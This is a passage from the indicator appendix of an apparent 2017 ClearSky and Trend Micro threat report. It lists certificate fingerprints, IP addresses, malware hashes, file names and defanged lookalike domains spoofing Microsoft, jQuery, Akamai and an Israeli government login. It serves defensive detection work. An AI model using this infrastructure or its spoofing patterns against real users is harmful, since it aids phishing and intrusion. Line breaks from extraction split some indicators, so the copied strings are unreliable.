\nhttp://fetchnews\n-\nagency[.]news\n-\nbbc.press/en/20170/pictures.doc\n \nSSLCertificate\n \nfa3d5d670dc1d153b\n999c3aec7b1d815cc33c4dc\n \nSSLCertificate\n \nb11aa089879cd7d4503285fa8623ec237a317aee\n \nSSLCertificate\n \n07317545c8d6fc9beedd3dd695ba79dd3818b941\n \nSSLCertificate\n \n3c0ecb46d65dd57c33df5f6547f8fffb3e15722d\n \nSSLCertificate\n \n1c43ed17acc07680924f2ec476d281c8c5fd6b4a\n \nSSLCertificate\n \n8968f439ef26f3fcded4387a67ea5f56ce24a003\n \nIPv4Address\n \n206.221.181.253\n \nIPv4Address\n \n66.55.152.164\n \nIPv4Address\n \n68.232.180.122\n \nIPv4Address\n \n173.244.173.11\n \nIPv4Address\n \n173.244.173.12\n \nIPv4Address\n \n173.244.173.13\n \nIPv4Address\n \n209.190.20.149\n \nIPv4Address\n \n209.190.20.59\n \nIPv4Address\n \n209.190.20.62\n \nIPv4Address\n \n209.51.199.116\n \nIPv4Address\n \n38.130.75.20\n \n  \nPage \n40\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nIPv4Address\n \n185.92.73.194\n \nIPv4Address\n \n144.168.45.126\n \nIPv4Address\n \n198.55.107.164\n \nIPv4Address\n \n104.200.128.126\n \nIPv4Address\n \n104.200.128.161\n \nIPv4Address\n \n104.200.128.173\n \nIPv4Address\n \n104.200.128.183\n \nIPv4Address\n \n104.200.128.184\n \nIPv4Address\n \n104.200.128.185\n \nIPv4Address\n \n104.200.128.187\n \nIPv4Address\n \n104.200.128.195\n \nIPv4Address\n \n104.200.128.196\n \nIPv4Address\n \n104.200.128.198\n \nIPv4Address\n \n104.200.128.205\n \nIPv4Address\n \n104.200.128.206\n \nIPv4Address\n \n104.200.128.208\n \nIPv4Address\n \n104.200.128.209\n \nIPv4Address\n \n104.200.128.48\n \nIPv4Address\n \n104.200.128.58\n \nIPv4Address\n \n104.200.128.64\n \nIPv4Address\n \n104.200.128.71\n \nIPv4Address\n \n107.181.160.138\n \nIPv4Address\n \n107.181.160.178\n \nIPv4Address\n \n107.181.160.194\n \nIPv4Address\n \n107.181.160.195\n \nIPv4Address\n \n107.181.161.141\n \nIPv4Address\n \n107.181.174.21\n \nIPv4Address\n \n107.181.174.228\n \nIPv4Address\n \n107.181.174.232\n \nIPv4Address\n \n107.181.174.241\n \nIPv4Address\n \n188.120.224.198\n \nIPv4Address\n \n188.120.228.172\n \nIPv4Address\n \n188.120.242.93\n \nIPv4Address\n \n188.120.243.11\n \nIPv4Address\n \n188.120.247.151\n \nIPv4Address\n \n62.109.2.52\n \nIPv4Address\n \n188.120.232.157\n \nIPv4Address\n \n185.118.65.230\n \nIPv4Address\n \n185.118.66.114\n \nIPv4Address\n \n141.105.67.58\n \nIPv4Address\n \n141.105.68.25\n \nIPv4Address\n \n141.105.68.26\n \nIPv4Address\n \n141.105.68.29\n \nIPv4Address\n \n141.105.69.69\n \nIPv4Address\n \n141.105.69.70\n \nIPv4Address\n \n141.105.69.77\n \nIPv4Address\n \n31.192.105.16\n \nIPv4Address\n \n31.192.105.17\n \nIPv4Address\n \n31.192.105.28\n \nIPv4Address\n \n146.0.73.109\n \nIPv4Address\n \n146.0.73.110\n \nIPv4Address\n \n146.0.73.111\n \nIPv4Address\n \n146.0.73.112\n \nIPv4Address\n \n146.0.73.114\n \n  \nPage \n41\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nIPv4Address\n \n217.12.201.240\n \nIPv4Address\n \n217.12.218.242\n \nIPv4Address\n \n5.34.180.252\n \nIPv4Address\n \n5.34.181.13\n \nIPv4Address\n \n86.105.18.5\n \nIPv4Address\n \n93.190.138.137\n \nIPv4Address\n \n212.199.61.51\n \nIPv4Address\n \n80.179.42.37\n \nIPv4Address\n \n80.179.42.44\n \nIPv4Address\n \n176.31.18.29\n \nIPv4Address\n \n188.165.69.39\n \nIPv4Address\n \n51.254.76.54\n \nIPv4Address\n \n158.69.150.163\n \nIPv4Address\n \n192.99.242.212\n \nIPv4Address\n \n198.50.214.62\n \nHash\n \na60a32f21ac1a2ec33135a650aa8dc71\n \nHash\n \n94ba33696cd6ffd6335948a752ec9c19\n \nHash\n \nbcae706c00e07936fc41ac47d671fc40\n \nHash\n \n1ca03f92f71d5ecb5dbf71b14d48495c\n \nHash\n \n506415ef517b4b1f7679b3664ad399e1\n \nHash\n \n1ca03f92f71d5ecb5dbf71b14d48495c\n \nHash\n \nbd38cab32b3b8b64e5d5d3df36f7c55a\n \nHash\n \nac29659dc10b2811372c83675ff57d23\n \nHash\n \n41466bbb49dd35f9aa3002e546da65eb\n \nHash\n \n8f6f7416cfdf8d500d6c3dcb33c4f4c9e1cd33998c957fea77fbd50471faec88\n \nHash\n \n02f2c896287bc6a71275e8ebe311630557800081862a56a3c22c143f2f3142bd\n \nHash\n \n2df6fe9812796605d4696773c91ad84c4c315df7df9cf78bee5864822b1074c9\n \nHash\n \n55f513d0d8e1fd41b1417a0eb2afff3a039a9529571196dd7882d1251ab1f9bc\n \nHash\n \nda529e0b81625828d52cd70efba50794\n \nHash\n \n1f9910cafe0e5f39887b2d5ab4df0d10\n \nHash\n \n0feb0b50b99f0b303a5081ffb3c4446d\n \nHash\n \n577577d6df1833629bfd0d612e3dbb05\n \nHash\n \n165f8db9c6e2ca79260b159b4618a496e1ed6730d800798d51d38f07b3653952\n \nHash\n \n1f867be812087722010f12028beeaf376043e5d7\n \nHash\n \nb571c8e0e3768a12794eaf0ce24e6697\n \nHash\n \ne319f3fb40957a5ff13695306dd9de25\n \nHash\n \nacf24620e544f79e55fd8ae6022e040257b60b33cf474c37f2877c39fbf2308a\n \nHash\n \n8c8496390c3ad048f2a0a4031edfcdac819ee840d32951b9a1a9337a2dcbea25\n \nHash\n \nc5a02e984ca3d5ac13cf946d2ba68364\n \nHash\n \nefca6664ad6d29d2df5aaecf99024892\n \nHa\nsh\n \nbff115d5fb4fd8a395d158fb18175d1d183c8869d54624c706ee48a1180b2361\n \nHash\n \nafa563221aac89f96c383f9f9f4ef81d82c69419f124a80b7f4a8c437d83ce77\n \nHash\n \n4a3d93c0a74aaabeb801593741587a02\n \nHash\n \n64c9acc611ef47486ea756aca8e1b3b7\n \nHash\n \nfb775e900872e01f65e606b722719594\n \nHash\n \ncf8502b8b67d11fbb0c75ebcf741db15\n \nHash\n \n4999967c94a2fb1fa8122f1eea7a0e02\n \nHash\n \n5fe0e156a308b48fb2f9577ed3e3b09768976fdd99f6b2d2db5658b138676902\n \nHash\n \n37449ddfc120c08e0c0d41561db79e8cbbb97238\n \nHash\n \n4442c48dd314a04ba4df046dfe43c9ea1d229ef8814e4d3195afa9624682d763\n \nHash\n \n7651f0d886e1c1054eb716352468ec6aedab06ed61e1eebd02bca4efbb974fb6\n \nHash\n \neb01202563dc0a1a3b39852ccda012acfe0b6f4d\n \nHash\n \n7e3c9323be2898d92666df33eb6e73a46c28e8e34630a2bd1db96aeb39586aeb\n \nH\nash\n \n9e5ab438deb327e26266c27891b3573c302113b8d239abc7f9aaa7eff9c4f7bb\n \n  \nPage \n42\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nHash\n \n6a19624d80a54c4931490562b94775b74724f200\n \nHash\n \n32860b0184676509241bbaf9233068d472472c3d9c93570fc072e1acea97a1d4\n \nHash\n \nb34721e53599286a1093c90a9dd0b789\n \nHash\n \n7ad65e39b79ad56c02a90dfab8090392ec5ffed10a8e276b86ec9b1f2524ad31\n \nHash\n \n59c448abaa6cd20ce7af33d6c0ae27e4a853d2bd\n \nHash\n \nfb775e900872e01f65e606b722719594\n \nHash\n \n871efc9ecd8a446a7aa06351604a9bf4\n \nHash\n \ncf8502b8b67d11fbb0c75ebcf741db15\n \nHash\n \na4dd1c225292014e65edb83f2684f2d5\n \nHash\n \n838fb8d181d52e9b9d212b49f4350739\n \nHash\n \ne37418ba399a095066845e7829267efe\n \nHash\n \n1072b82f53fdd9fa944685c7e498eece89b6b4240073f654495ac76e303e65c9\n \nHash\n \n752240cddda5acb5e8d026cef82e2b54\n \nHash\n \n435a93978fa50f55a64c788002da58a5\n \nHash\n \n3de91d07ac762b193d5b67dd5138381a\n \nHash\n \na4adbea4fcbb242f7eac48ddbf13c814d5eec9220f7dce01b2cc8b56a806cd37\n \nHash\n \naba7771c42aea8048e4067809c786b0105e9dfaa\n \nHash\n \nb01e955a34da8698fae11bf17e3f79a054449f938257284155aeca9a2d3815dd\n \nHash\n \n3676914af9fd575deb9901a8b625f032\n \nHash\n \nf1607a5b918345f89e3c2887c6dafc05c5832593\n \nHash\n \n341c920ec47efa4fd1bfcd1859a7fb98945f9d85\n \nHash\n \n8b702ba2b2bd65c3ad47117515f0669c\n \nHash\n \n6ea02f1f13cc39d953e5a3ebcdcfd882\n \nHash\n \n8f77a9cc2ad32af6fb1865fdff82ad89\n \nHash\n \n62f8f45c5f10647af0040f965a3ea96d\n \nHash\n \nd9aa197ca2f01a66df248c7a8b582c40\n \nHash\n \n217b1c2760bcf4838f5e3efb980064d7\n \nHash\n \ncfb4be91d8546203ae602c0284126408\n \nHash\n \n16a711a8fa5a40ee787e41c2c65faf9a78b195307ac069c5e13ba18bce243d01\n \nHash\n \n5e65373a7c6abca7e3f75ce74c6e8143\n \nHash\n \nd3b9da7c8c54f7f1ea6433ac34b120a1\n \nHash\n \n32261fe44c368724593fbf65d47fc826\n \nHash\n \nd2c117d18cb05140373713859803a0d6\n \nHash\n \n113ca319e85778b62145019359380a08\n \nHash\n \n4999967c94a2fb1fa8122f1eea7a0e02\n \nHash\n \n9846b07bf7265161573392d24543940e\n \nHash\n \nbf23ce4ae7d5c774b1fa6becd6864b3b\n \nHash\n \n720203904c9eaf45ff767425a8c518cd\n \nHash\n \n62652f074924bb961d74099bc7b95731\n \nHash\n \n1fba1876c88203a2ae6a59ce0b5da2a1\n \nHash\n \ncf8502b8b67d11fbb0c75ebcf741db15\n \nHash\n \nfb775e900872e01f65e606b722719594\n \nHash\n \n73f14f320facbdd29ae6f0628fa6f198dc86ba3428b3eddbfc39cf36224cebb9\n \nHash\n \n3d2885edf1f70ce4eb1e9519f47a669f\n \nFilename\n \nconfig.exe\n \nFilename\n \nStrike.doc\n \nFilename\n \nmalware.doc\n \nFilename\n \nPDFOPENER_CONSOLE.exe\n \nFilename\n \nMa_1.tmp\n \nFilename\n \nWextract\n \nFilename\n \nThe%20United%20Nations%20Counter.doc.docx\n \nFilename\n \nnetsrvs.exe\n \nFilename\n \nDate.dotm\n \nFilename\n \nssl.docx\n \n  \nPage \n43\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nFilename\n \no040t.exe\n \nFilename\n \nm8f7s.exe\n \nFilename\n \nd5tjo.exe\n \nFilename\n \nLogManager.tmp\n \nFilename\n \nedg1CF5.tmp\n \nFilename\n \nntuser.swp\n \nFilename\n \nsvchost64.swp\n \nFilename\n \nntuser.dat.swp\n \nFilename\n \n455aa96e\n-\n804g\n-\n4bcf\n-\nbcf8\n-\nf400b3a9cfe9.PackageExtraction\n \nFilename\n \nSvchost32.swp\n \nFilename\n \nSvchost64.swp\n \nFilename\n \nupdate5x.dll\n \nFilename\n \n22092014_ver621.dll\n \n \n \n \n \n \nFilename\n \nnetsrv.exe\n \nFilename\n \nnetsrva.exe\n \nFilename\n \nnetsrvd.exe\n \nFilename\n \nnetsrvs.exe\n \nFilename\n \nvminst.tmp\n \nFilename\n \ntdtess.exe\n \nFilename\n \ntest_oracle.xls\n \nFilename\n \nur96r.exe\n \nFilename\n \nThe North \nKorean weapons program now testing USA range.docx\n \nFilename\n \nF123321.exe\n \nDomain\n \nwethearservice[.]com\n \nDomain\n \nmywindows24[.]in\n \nDomain\n \nmicrosoft\n-\noffice[.]solutions\n \nDomain\n \ncode[.]jguery[.]net\n \nDomain\n \n1m100[.]tech\n \nDomain\n \ncloudflare\n-\nstatics[.]com\n \nDomain\n \ncachevideo[.]com\n \nDomain\n \nwinfeedback[.]net\n \nDomain\n \nterendmicro[.]com\n \nDomain\n \nalkamaihd[.]com\n \nDomain\n \nmsv\n-\nupdates[.]gsvr\n-\nstatic[.]co\n \nDomain\n \nfbstatic\n-\na[.]space\n \nDomain\n \nbroadcast\n-\nmicrosoft[.]tech\n \nDomain\n \nsharepoint\n-\nmicrosoft[.]co\n \nDomain\n \nnewsfeeds\n-\nmicrosoft\n[.]press\n \nDomain\n \nowa\n-\nmicrosoft[.]online\n \nDomain\n \ndigicert[.]online\n \nDomain\n \ncloudflare\n-\nanalyse[.]com\n \nDomain\n \nisraelnewsagency[.]link\n \nDomain\n \nakamaitechnology[.]tech\n \nDomain\n \nwinupdate64[.]org\n \nDomain\n \nads\n-\nyoutube[.]net\n \nDomain\n \ncortana\n-\nsearch[.]com\n \nDomain\n \nnsserver[.]host\n \nDomain\n \nnameserver[.]win\n \nDomain\n \nsymcd[.]xyz\n \nDomain\n \nfdgdsg[.]xyz\n \nDomain\n \ndnsserv[.]host\n \nDomain\n \nwinupdate64[.]com\n \nDomain\n \nssl\n-\ngstatic[.]online\n \nDomain\n \nupdatedrivers[.]org\n \n  \nPage \n44\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nDomain\n \nalkamaihd[.]net\n \nDomain\n \nupdate[.]microsoft\n-\noffice[.]solutions\n \nDomain\n \njavaupdate[.]co\n \nDomain\n \noutlook360[.]org\n \nDomain\n \nwinupdate64[.]net\n \nDomain\n \ntrendmicro[.]tech\n \nDomain\n \nqoldenlines[.]net\n \nDomain\n \nwindefender[.]org\n \nDomain\n \n1e100[.]tech\n \nDomain\n \nchromeupdates[.]online\n \nDomain\n \nads\n-\nyoutube[.]online\n \nDomain\n \nakamaitechnology[.]com\n \nDomain\n \ncloudmicrosoft[.]net\n \nDomain\n \njs[.]jguery[.]online\n \nDomain\n \nazurewebsites[.]tech\n \nDomain\n \nelasticbeanstalk[.]tech\n \nDomain\n \njguery[.]online\n \nDomain\n \nmicrosoft\n-\nsecurity[.]host\n \nDomain\n \nmicrosoft\n-\nds[.]com\n \nDomain\n \njguery[.]net\n \nDomain\n \nprimeminister\n-\ngoverment\n-\ntechcenter[.]tech\n \nDomain\n \nofficeapps\n-\nlive[.]com\n \nDomain\n \nmicrosoft\n-\ntool[.]com\n \nDomain\n \ncissco[.]net\n \nDomain\n \njs[.]jguery[.]net\n \nDomain\n \nf\n-\ntqn[.]com\n \nDomain\n \njavaupdator[.]com\n \nDomain\n \nofficeapps\n-\nlive[.]net\n \nDomain\n \nipresolver[.]org\n \nDomain\n \nintelchip[.]org\n \nDomain\n \noutlook360[.]net\n \nDomain\n \nwindowkernel[.]com\n \nDomain\n \nwheatherserviceapi[.]info\n \nDomain\n \nwindowslayer[.]in\n \nDomain\n \nsdlc\n-\nesd\n-\noracle[.]online\n \nDomain\n \nmpmicrosoft[.]com\n \nDomain\n \nofficeapps\n-\nlive[.]org\n \nDomain\n \ncachevideo[.]online\n \nDomain\n \nwin\n-\nupdate[.]com\n \nDomain\n \nlabs\n-\ncloudfront[.]com\n \nDomain\n \nwindowskernel14[.]com\n \nDomain\n \nfbstatic\n-\nakamaihd[.]com\n \nDomain\n \nmcafee\n-\nanalyzer[.]com\n \nDomain\n \ncloud\n-\nanalyzer[.]com\n \nDomain\n \nfb\n-\nstatics[.]com\n \nDomain\n \nynet[.]link\n \nDomain\n \ntwiter\n-\nstatics[.]info\n \nDomain\n \ndiagnose[.]microsoft\n-\noffice[.]solutions\n \nDomain\n \nmswordupdate17[.]com\n \nDomain\n \ngsvr\n-\nstatic[.]co\n \nDomain\n \nnews\n-\nbbc[.]press\n \nDomain\n \nmandalasanati[.]info\n \nDomain\n \noffice\n-\nmsupdate[.]solutions\n \nDomain\n \nwindows\n-\nupdates[.]solutions\n \n  \nPage \n45\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nDomain\n \nakamai\n-\nnet[.]network\n \nDomain\n \nazureedge\n-\nnet[.]services\n \nDomain\n \ndoucbleclick[.]tech\n \nDomain\n \nwindows\n-\nupdates[.]services\n \nDomain\n \nwindows\n-\nupdates[.]network\n \nDomain\n \ncloudfront[.]site\n \nDomain\n \nnetcdn\n-\ncachefly[.]network\n \nDomain\n \nakamaized[.]online\n \nDomain\n \ncdninstagram[.]center\n \nDomain\n \ngooglusercontent[.]center\n \nDNSName\n \nea\n-\nin\n-\nf354[.]1e100[.]ads\n-\nyoutube[.]net\n \nDNSName\n \nns1[.]ynet[.]link\n \nDNSName\n \nns2[.]ynet[.]link\n \nDNSName\n \nstatic[.]dyn\n-\nusr[.]g\n-\nblc\n-\nse[.]d45[.]a63[.]akamai[.]be\n-\n5\n-\n0\n-\nibr01\n-\nlts\n-\nntwk\n-\nmsn[.]alkamaihd[.]com\n \nDNSName\n \npht[.]is[.]nlb\n-\ndeploy[.]edge\n-\ndyn[.]e11[.]f20[.]ads\n-\nyoutube[.]online\n \nDNSName\n \nns1[.]winfeedback[.]net\n \nDNSName\n \nns2[.]winfeedback[.]net\n \nDNSName\n \nmsupdate[.]diagnose[.]microsoft\n-\noffice[.]solutions\n \nDNSName\n \nwww[.]alkamaihd[.]net\n \nDNSName\n \nc20[.]jdk[.]cdn\n-\nextern\nal\n-\nie[.]1e100[.]alkamaihd[.]net\n \nDNSName\n \nns2[.]img[.]twiter\n-\nstatics[.]info\n \nDNSName\n \napi[.]img[.]twiter\n-\nstatics[.]info\n \nDNSName\n \nns1[.]img[.]twiter\n-\nstatics[.]info\n \nDNSName\n \nns1[.]officeapps\n-\nlive[.]net\n \nDNSName\n \nns1[.]wheatherserviceapi[.]info\n \nDNSName\n \nns2[.]\nmicrosoft\n-\ntool[.]com\n \nDNSName\n \nns2[.]f\n-\ntqn[.]com\n \nDNSName\n \ncarl[.]ns[.]cloudflare[.]com[.]sdlc\n-\nesd\n-\noracle[.]online\n \nDNSName\n \nns1[.]cortana\n-\nsearch[.]com\n \nDNSName\n \n40[.]dc[.]c0ad[.]ip4[.]dyn[.]gsvr\n-\nstatic[.]co\n \nDNSName\n \n40[.]dc[.]c2ad[.]ip4[.]dyn[.]gsvr\n-\nstatic[.]co\n \nDNSName\n \nns2[.]winupdate64[.]org\n \nDNSName\n \nns1[.]f\n-\ntqn[.]com\n \nDNSName\n \nns2[.]cortana\n-\nsearch[.]com\n \nDNSName\n \nns1[.]symcd[.]xyz\n \nDNSName\n \nns2[.]symcd[.]xyz\n \nDNSName\n \nns1[.]winupdate64[.]org\n \nDNSName\n \nns1[.]microsoft\n-\ntool[.]com\n \nDNSName\n \nns2[.]\nofficeapps\n-\nlive[.]com\n \nDNSName\n \nns1[.]israelnewsagency[.]link\n \nDNSName\n \nns2[.]israelnewsagency[.]link\n \nDNSName\n \nns1[.]cissco[.]net\n \nDNSName\n \nns2[.]cissco[.]net\n \nDNSName\n \nns1[.]cachevideo[.]online\n \nDNSName\n \nns2[.]cachevideo[.]online\n \nDNSName\n \nwww[.]static[.]dyn\n-\nusr[.]g\n-\nblc\n-\nse[.]d45[.]a63[.]akamai[.]alkamaihd[.]com\n \nDNSName\n \nstatic[.]dyn\n-\nusr[.]g\n-\nblc\n-\nse[.]d45[.]a63[.]akamai[.]www[.]alkamaihd[.]com\n \nDNSName\n \ndhb[.]stage[.]12735072[.]40[.]dc[.]c0ad[.]ip4[.]sta[.]gsvr\n-\nstatic[.]co\n \nDNSName\n \nmain[.]windo\nwskernel14[.]com\n \nDNSName\n \nwww[.]winupdate64[.]net\n \nDNSName\n \nae13\n-\n0\n-\nhk2\n-\n96cbe\n-\n1a\n-\nntwk\n-\nmsn[.]static[.]dyn\n-\nusr[.]g\n-\nblc\n-\nse[.]d45[.]a63[.]akamai[.]alkamaihd[.]com\n \nDNSName\n \nbe\n-\n5\n-\n0\n-\nibr01\n-\nlts\n-\nntwk\n-\nmsn[.]static[.]dyn\n-\nusr[.]g\n-\nblc\n-\nse[.]d45[.]a63[.]akamai[.]alkamaihd[.]com\n \n  \nPage \n46\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nDNSName\n \nstatic[.]dyn\n-\nusr[.]g\n-\nblc\n-\nse[.]d45[.]a63[.]akamai[.]static[.]dyn\n-\nusr[.]g\n-\nblc\n-\nse[.]d45[.]a63[.]akamai[.]alkamaihd[.]com\n \nDNSName\n \ncyb[.]stage[.]12735072[.]\n40[.]dc[.]c0ad[.]ip4[.]sta[.]gsvr\n-\nstatic[.]co\n \nDNSName\n \nns1[.]winupdate64[.]com\n \nDNSName\n \nns1[.]twiter\n-\nstatics[.]info\n \nDNSName\n \n40[.]dc[.]c0ad[.]ip4[.]dyn[.]gsvr\n-\nstatic[.]co\n \nDNSName\n \nupdate[.]microsoft\n-\noffice[.]solutions\n \nDNSName\n \nwk\n-\nin\n-\nf104[.]1e100[.]n[.]microsoft[.]qoldenlines[.]net\n \nDNSName\n \nns1[.]fb\n-\nstatics[.]com\n \nDNSName\n \nns2[.]fb\n-\nstatics[.]com\n \nDNSName\n \nis\n-\ncdn[.]edge[.]g18[.]dyn[.]usr\n-\ne12\n-\nas[.]akamaitechnology\n \nDNSName\n \nimg[.]gmailtagmanager[.]com\n \nDNSName\n \nwk\n-\nin\n-\nf104[.]1c100[.]n[.]microsoft\n-\nsecurity[.]host\n \nDNSName\n \nmsnbot\n-\nsd7\n-\n46\n-\ncdn[.]microsoft\n-\nsecurity[.]host\n \nDNSName\n \nmsnbot\n-\nsd7\n-\n46\n-\nimg[.]microsoft\n-\nsecurity[.]host\n \nDNSName\n \nns2[.]winupdate64[.]com\n \nDNSName\n \nmsnbot\n-\nsd7\n-\n46\n-\n194[.]microsoft\n-\nsecurity[.]host\n \nDNSName\n \nea\n-\nin\n-\nf155[.]1e100[.]microsoft\n-\nsecurity[.]host\n \nDNSName\n \nmsnbot\n-\n207\n-\n46\n-\n194[.]microsoft\n-\nsecurity[.]host\n \nDNSName\n \nimg[.]twiter\n-\nstatics[.]info\n \nDNSName\n \nmsnbot\n-\nsd7\n-\n46\n-\ncdn[.]microsoft\n-\nsecurity[.]host\n \nDNSName\n \nns2[.]wheatherserviceapi[.]info\n \nDNSName\n \nns1[.]windowkernel[.]com\n \nDNSName\n \nns2[.]windowkernel[.]com\n \nDNSName\n \nns2[.]fbstatic\n-\na[.]space\n \nDNSName\n \nns1[.]fbstatic\n-\na[.]space\n \nDNSName\n \napi[.]TwitEr\n-\nStatics[.]info\n \nDNSName\n \nns2[.]mcafee\n-\nanalyzer[.]com\n \nDNSName\n \n21666[.]mpmicrosoft[.]com\n \nDNSName\n \n22830[.]\nofficeapps\n-\nlive[.]org\n \nDNSName\n \n15236[.]mcafee\n-\nanalyzer[.]com\n \nDNSName\n \nns2[.]static[.]dyn\n-\nusr[.]gsrv02[.]ssl\n-\ngstatic[.]online\n \nDNSName\n \nns1[.]mcafee\n-\nanalyzer[.]com\n \nDNSName\n \nns1[.]fbstatic\n-\nakamaihd[.]com\n \nDNSName\n \nns1[.]static[.]dyn\n-\nusr[.]gsrv01[.]ssl\n-\ngstatic\n[.]online\n \nDNSName\n \nns2[.]officeapps\n-\nlive[.]org\n \nDNSName\n \nwk\n-\nin\n-\nf104[.]1e100[.]n[.]microsoft\n-\nsecurity[.]host\n \nDNSName\n \nns1[.]mpmicrosoft[.]com\n \nDNSName\n \nwww[.]microsoft\n-\nsecurity[.]host\n \nDNSName\n \nns2[.]fbstatic\n-\nakamaihd[.]com\n \nDNSName\n \nns1[.]cachevideo[.]online\n \nDNSName\n \nwk\n-\nin\n-\nf100[.]1e100[.]n[.]microsoft\n-\nsecurity[.]host\n \nDNSName\n \nns1[.]officeapps\n-\nlive[.]org\n \nDNSName\n \nns2[.]mpmicrosoft[.]com\n \nDNSName\n \nns02[.]nsserver[.]host\n \nDNSName\n \nns2[.]cachevideo[.]online\n \nDNSName\n \nbe\n-\n5\n-\n0\n-\nibr01\n-\nlts\n-\nntwk\n-\nmsn[.]alkamaihd[.]com\n \nDNSName\n \nstatic[.]dyn\n-\nusr[.]g\n-\nblc\n-\nse[.]d45[.]a63[.]akamai[.]alkamaihd[.]com\n \nDNSName\n \nwww[.]alkamaihd[.]com\n \nDNSName\n \nae13\n-\n0\n-\nhk2\n-\n96cbe\n-\n1a\n-\nntwk\n-\nmsn[.]alkamaihd[.]com\n \nDNSName\n \nns2[.]microsoft\n-\nds[.]com\n \nDNSName\n \nadcenter[.]microsoft\n-\nds[.]com\n \nDNSName\n \nns1[.]\nmicrosoft\n-\nds[.]com\n \nDNSName\n \nns1[.]mswordupdate17[.]com\n \n  \nPage \n47\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nDNSName\n \nns2[.]mswordupdate17[.]com\n \nDNSName\n \nc[.]mswordupdate17[.]com\n \nDNSName\n \nns1[.]cloudflare\n-\nanalyse[.]com\n \nDNSName\n \nstatic[.]dyn\n-\nusr[.]f\n-\nloginme[.]c19[.]a23[.]akamaitechnology[.]com\n \nDNSName\n \nns2[.]\ncloudflare\n-\nanalyse[.]com\n \nDNSName\n \nns1[.]cloud\n-\nanalyzer[.]com\n \nDNSName\n \nns2[.]cloud\n-\nanalyzer[.]com\n \nDNSName\n \nns01[.]nsserver[.]host\n \nDNSName\n \nns1[.]fb\n-\nstatics[.]com\n \nDNSName\n \nns02[.]dnsserv[.]host\n \nDNSName\n \n15236[.]cachevideo[.]online\n \nDNSName\n \nns2[.]fb\n-\nstatics[.]com\n \nDNSName\n \nns2[.]twiter\n-\nstatics[.]info\n \nDNSName\n \nea\n-\nin\n-\nf113[.]1e100[.]microsoft\n-\nsecurity[.]host\n \nDNSName\n \nstatic[.]dyn\n-\nusr[.]f\n-\nlogin\n-\nme[.]c19[.]a[.]akamaitechnology[.]tech\n \nDNSName\n \nea\n-\nin\n-\nf155[.]1e100[.]microsoft\n-\nsecurity[.]host\n \nDNSName\n \nfloat[.]2963[.]bm\n-\nimp[.]akamaitechnology[.]tech\n \nDNSName\n \nns1[.]mcafee\n-\nanalyzer[.]com\n \nDNSName\n \nns2[.]mcafee\n-\nanalyzer[.]com\n \nDNSName\n \nns1[.]mpmicrosoft[.]com\n \nDNSName\n \nns2[.]mpmicrosoft[.]com\n \nDNSName\n \njpsrv\n-\njava\n-\njdkec1[.]javaupdate[.]co\n \nDNSName\n \nmicrosoft\n-\nactive[.]directory_update\n-\nchange\n-\npolicy[.]primeminister\n-\ngoverment\n-\ntechcenter[.]tech\n \nDNSName\n \njpsrv\n-\njava\n-\njdkec3[.]javaupdate[.]co\n \nDNSName\n \nnameserver02[.]javaupdate[.]co\n \nDNSName\n \njpsrv\n-\njava\n-\njdkec2[.]javaupdate[.]co\n \nDNSName\n \nstatic[.]dyn\n-\nusr[.]f\n-\nlo\ngin\n-\nme[.]c19[.]a23[.]akamaitechnology[.]com\n \nDNSName\n \nstatic[.]dyn\n-\nusr[.]g\n-\nblc\n-\nse[.]d45[.]a63[.]alkamaihd[.]net\n \nDNSName\n \nssl[.]pmo[.]gov[.]il\n-\ndana\n-\nnaauthurl1\n-\nwelcome[.]cgi[.]primeminister\n-\ngoverment\n-\ntechcenter[.]tech\n \nDNSName\n \nns1[.]static[.]dyn\n-\nusr\n[.]gsrv01[.]ssl\n-\n \ngstatic[.]online\n \nDNSName\n \nns2[.]static[.]dyn\n-\nusr[.]gsrv02[.]ssl\n-\n \ngstatic[.]online\n \nDNSName\n \nstatic[.]primeminister\n-\ngoverment\n-\ntechcenter[.]tech\n \nDNSName\n \nns1[.]outlook360[.]org\n \nDNSName\n \nd45[.]a63[.]alkamaihd[.]net\n \nDNSName\n \nns1[.]officeapps\n-\nli\nve[.]org\n \nDNSName\n \nns2[.]outlook360[.]org\n \nDNSName\n \nns2[.]officeapps\n-\nlive[.]org\n \nDNSName\n \nns2[.]win\n-\nupdate[.]com\n \nDNSName\n \naaa[.]stage[.]14043411[.]email[.]sharepoint\n-\nmicrosoft[.]co\n \nDNSName\n \nns1[.]updatedrivers[.]org\n \nDNSName\n \na17\n-\nh16[.]g11[.]iad17[.]as[.]pht\n-\nexternal[.]c15[.]qoldenlines[.]net\n \nDNSName\n \nns1[.]windefender[.]org\n \nDNSName\n \nis\n-\ncdn[.]edge[.]g18[.]dyn[.]usr\n-\ne12\n-\nas[.]akamaitechnology[.]com\n \nDNSName\n \nns2[.]windefender[.]org\n \nDNSName\n \nns1[.]win\n-\nupdate[.]com\n \nDNSName\n \nns2[.]\nupdatedrivers[.]org\n \nDNSName\n \nns1[.]mpmicrosoft[.]com\n \nDNSName\n \nns1[.]officeapps\n-\nlive[.]org\n \nDNSName\n \nns2[.]officeapps\n-\nlive[.]org\n \nDNSName\n \nns2[.]ipresolver[.]org\n \nDNSName\n \nns1[.]ipresolver[.]org\n \nDNSName\n \nwww[.]is\n-\ncdn[.]edge[.]g18[.]dyn[.]usr\n-\ne12\n-\nas[.]akamaitechnology[.]com\n \nDNSName\n \n11716[.]cachevideo[.]com\n \nDNSName\n \nns1[.]intelchip[.]org\n \n  \nPage \n48\n \nof \n48\n \n\u00a9All rights reserved to ClearSky cyber security and Trend Micro, 2017\n \n \n \nDNSName\n \nns2[.]cachevideo[.]com\n \nDNSName\n \n7737[.]cloudflare\n-\nstatics[.]com\n \nDNSName\n \n7052[.]cloudflare\n-\nstatics[.]com\n \nDNSName\n \n7737[.]digicert[.]online\n \nDNSName\n \nns1[.]cloudflare\n-\nstatics[.]com\n \nDNSName\n \n24984[.]cachevideo[.]com\n 